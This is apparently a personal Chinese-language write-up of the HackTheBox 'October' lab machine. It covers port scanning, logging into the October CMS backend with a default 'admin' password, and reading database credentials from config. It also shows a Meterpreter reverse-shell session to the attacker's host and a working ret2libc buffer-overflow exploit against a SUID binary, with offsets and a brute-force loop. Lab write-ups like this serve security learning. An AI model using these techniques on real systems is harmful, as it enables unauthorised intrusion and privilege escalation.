---
title: "HackTheBox：October笔记(PWN)"
slug: qmariy
translationKey: qmariy
date: 2020-04-24T23:29:56+08:00
source: yuque/penetration
---

## 信息收集
## Nmap
```sql
root@localhost:~/HTB/october# nmap  -p22,80 -sV -sC 10.10.10.16 --min-rate 1000
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 14:48 UTC
Nmap scan report for 10.10.10.16
Host is up (0.54s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

+ Server: Apache/2.4.7 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.21
```

## 80端口：弱密码
一款叫`october`的`cms`，用searchsploit搜索，有一些漏洞，但有效利用还需要确定版本号，去github上看源代码中版本号的位置，存在网页根目录下的`composer.json`文件中，测试外部无法直接访问，`changelog`和`readme`里也无版本信息，作罢。后来拿下了www-data权限后，看到是版本`1.0.412`

```sql
root@localhost:~/HTB/october# searchsploit october
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
October CMS - Upload Protection Bypass | exploits/php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnera | exploits/php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scr | exploits/php/webapps/44144.txt
October CMS User Plugin 1.4.5 - Persis | exploits/php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross | exploits/php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross | exploits/php/webapps/43106.txt
--------------------------------------- ----------------------------------------
Shellcodes: No Result
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1587743015752-e4b4f0fe-f977-4453-8853-4611207cb152.png)

`cookie`感觉有东西，但是解开来发现并不是jwt，作罢

扫描下目录

```sql
irbuster -u http://10.10.10.16 -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -v
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588001877173-57637cb7-7229-4831-a67e-984a3a14d6b1.png)

上面图片并不完整（扫描是真的慢），总之找到后台路径`/backend/backend/auth/signin`，会回显账号是否存在，得到帐号`admin`，burp跑字典结果直接给我ban了。。。。。

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588002377571-dd4e5414-4d71-48da-92ea-08df5866464d.png)



注册了个用户，没找到越权或者上传点。

最后看别人的`walkthrough`，弱口令`admin`直接进后台了，给爷整吐了。。。。（已经是第二次被这个admin拦在外面了，果然是经验不丰富啊！！)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588002977053-b4a72fb6-484b-4948-be6f-f61ac35ab9ee.png)

后面到user几乎就乏善可陈了，简单写下

# 提权
```sql
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux

Ubuntu 14.04.5 LTS
```

一般提权就几种思路：配置错误（包括sudo误配，suid滥用，高权限定时任务等）、密码通用和exp提权

## 常用密码
读配置文件，尝试登录`harry`失败

```sql
/var/www/html/cms/config/database.php

        'mysql' => [
            'driver'    => 'mysql',
            'host'      => 'localhost',
            'port'      => '',
            'database'  => 'october',
            'username'  => 'october',
            'password'  => 'OctoberCMSPassword!!',
            'charset'   => 'utf8',
            'collation' => 'utf8_unicode_ci',
            'prefix'    => '',
        ],
        
  
```

读数据库账号密码

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1588003425220-ffb8cf02-d6ed-4aa7-af68-f5661a21b29c.png)



## msf一把梭
```sql
msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                                                         Connection
  --  ----  ----                   -----------                                                         ----------
  2         meterpreter x86/linux  no-user @ october (uid=33, gid=33, euid=33, egid=33) @ 10.10.10.16  10.10.16.122:4443 -> 10.10.10.16:59910 (10.10.10.16)

msf5 post(multi/recon/local_exploit_suggester) > set session 2
session => 2

msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.16 - Collecting local exploits for x86/linux...
[*] 10.10.10.16 - 34 exploit checks are being tried...
[+] 10.10.10.16 - exploit/linux/local/apport_abrt_chroot_priv_esc: The target appears to be vulnerable.
[+] 10.10.10.16 - exploit/linux/local/pkexec: The service is running, but could not be validated.


```

在`linux/x86/meterpreter/reverse_tcp`的会话下尝试，均失败。

## exp提权
用`linpeas.sh`脚本搜索到

```sql
[+] Unmounted file-system?
[i] Check if you can mount umounted devices

/dev/mapper/october--vg-root /               ext4    errors=remount-ro 0       1
UUID=9d82af70-c08b-4ec2-af22-6754638dc49f /boot           ext2    defaults        0       2
/dev/mapper/october--vg-swap_1 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
```

无果无果。。

## suid权限的文件
```sql
(www-data:/var/www/html/cms/storage/app/media) $ find / -perm -u=s 2>/dev/null
  /bin/umount
  /bin/ping
  /bin/fusermount
  /bin/su
  /bin/ping6
  /bin/mount
  /usr/lib/eject/dmcrypt-get-device
  /usr/lib/openssh/ssh-keysign
  /usr/lib/policykit-1/polkit-agent-helper-1
  /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  /usr/bin/sudo
  /usr/bin/newgrp
  /usr/bin/pkexec
  /usr/bin/passwd
  /usr/bin/chfn
  /usr/bin/gpasswd
  /usr/bin/traceroute6.iputils
  /usr/bin/mtr
  /usr/bin/chsh
  /usr/bin/at
  /usr/sbin/pppd
  /usr/sbin/uuidd
  /usr/local/bin/ovrflw
```

没有常见的几种可利用的东西，~~暂放一放。~~实际上，`overflow`应该是黑阔关注的词，我们拖回本机看看

```sql
# 靶机输入
nc 10.10.16.122 666 < ovrflw

# 本机输入
nc -lvp 666 > overflow
```

后面是用pwn的一些方法，通过bufferoverflow拿到了root权限，牛！继续学习下

```sql
root@localhost:~/HTB/october# checksec --file=overflow

RELRO           STACK CANARY      NX            PIE      RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE   No RPATH   No RUNPATH   69 Symbols     No	0		2overflow
```





# BufferOverFlow
## PoC
向缓冲区输入**比较长**的字符串（只要几十几百即可，可用burp来fuzz），若出现段错误，即认为是溢出

```sql
./overflow `python -c 'print "Z"*200'`
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590798811785-69c12a88-8789-4c5a-bf70-29bcfde12f76.png)

> 在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，
>
> 例如存在DEP（NX）的话就不能直接执行栈上的数据，
>
> 存在ASLR的话各个系统调用的地址就是随机化的。
>

## strings查看大致内容
```sql
#  strings overflow 

/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
strcpy
...
```

## ldd查看库
> **ldd命令**用于打印程序或者库文件所依赖的共享库列表。
>

```sql
# ldd -v overflow
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dcb000)
	/lib/ld-linux.so.2 (0xf7fd4000)

	Version information:
	./overflow:
		libc.so.6 (GLIBC_2.0) => /lib32/libc.so.6
	/lib32/libc.so.6:
		ld-linux.so.2 (GLIBC_2.3) => /lib/ld-linux.so.2
		ld-linux.so.2 (GLIBC_PRIVATE) => /lib/ld-linux.so.2
		ld-linux.so.2 (GLIBC_2.1) => /lib/ld-linux.so.2

```



## 调试前关闭ASLR
```sql
echo 0 > /proc/sys/kernel/randomize_va_space
//原本值是2
```

## checksec查看程序保护机制
```sql
# gdb-peda$ checksec 

  CANARY    : disabled
  FORTIFY   : disabled
  NX        : ENABLED
  PIE       : disabled
  RELRO     : Partial
  
```

### NX
NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行



## 构造超长字符串
```sql
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

## gdb调试确定偏移量


```sql
# gdb ./overflow
gdb-peda$ b main
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
gdb-peda$ c
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590803270814-779bd876-0106-4e6c-9fc4-bc2e85f73e3f.png)

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1590803269185-1818818c-8d8e-4f70-a34c-2aec94eb6654.png)



```sql
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q d7Ad  
[*] Exact match at offset 112
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 64413764    
[*] Exact match at offset 112

```

也就是说，我们从在112字节后覆盖EIP



## ret to libc
> r2libc技术是一种缓冲区溢出利用技术，主要用于克服常规缓冲区溢出漏洞利用技术中面临的no stack executable限制(所以后续实验还是需要关闭系统的ASLR，以及堆栈保护)，比如PaX和ExecShield安全策略。该技术主要是通过覆盖栈帧中保存的函数返回地址(eip)，让其定位到libc库中的某个库函数(如，system等)，而不是直接定位到shellcode
>
> ————————————————
>
> 版权声明：本文为CSDN博主「大1234草」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
>
> 原文链接：[https://blog.csdn.net/sinat_38816924/java/article/details/106222286](https://blog.csdn.net/sinat_38816924/java/article/details/106222286)
>





> 一般system函数会与所有的c库函数一起通过libc加载到程序中（linux下）。(所以叫ret to libc)每个c语言程序都可以调用system函数。而system函数在libc中的位置是固定的。objdump或者ida直接找到就可以了。关键的问题是我们不知道libc在加载到程序中后，它的基地址是多少。每次程序运行时，libc的基础地址会变动。要解决的问题就是leak(泄露)基地址。一旦得到基地址，就可以用 “基地址 + system在libc中地址”计算出system的真实地址。
>
> ————————————————
>
> 版权声明：本文为CSDN博主「zh_explorer」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
>
> 原文链接：[https://blog.csdn.net/zh_explorer/java/article/details/80306965](https://blog.csdn.net/zh_explorer/java/article/details/80306965)
>
> 
>

确定偏移+爆破

```sql
p system
$1 = {<text variable, no debug info>} 0xf7e0f620 <system>

p exit
$2 = {<text variable, no debug info>} 0xf7e02390 <exit>

```

```sql
exit: 0xb75f8000+0x33260 = 0xB762B260
system: 0xb75f8000+0x40310 = 0xB7638310
/bin/sh: = 0xb75f8000+0x162bac = 0xB775ABAC
```



```python
while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x83\x63\xb7" + "\x60\xb2\x62\xb7" + "\xac\xab\x75\xb7"'); done

```

# reference
+ [https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html](https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html)
+ [return2libc学习笔记 - 路人甲](https://blog.csdn.net/sinat_38816924/article/details/106222286)
+ [linux程序的常用保护机制 - 都是一家人 - 博客园](https://www.cnblogs.com/Spider-spiders/p/8798628.html)
+ [pwn技巧之ret to libc_shell_这里没人-CSDN博客](https://blog.csdn.net/zh_explorer/article/details/80306965)
+ [https://teckk2.github.io/writeup/2018/02/23/October.html](https://teckk2.github.io/writeup/2018/02/23/October.html)
+ [https://github.com/Kyuu-Ji/htb-write-up/blob/fc6164f37d12498c73d37d6e267d501b26e37334/october/write-up-october.md](https://github.com/Kyuu-Ji/htb-write-up/blob/fc6164f37d12498c73d37d6e267d501b26e37334/october/write-up-october.md)
+ [https://0xdf.gitlab.io/2019/03/26/htb-october.html](https://0xdf.gitlab.io/2019/03/26/htb-october.html)
+ [https://teckk2.github.io/writeup/2018/02/23/October.html](https://teckk2.github.io/writeup/2018/02/23/October.html)

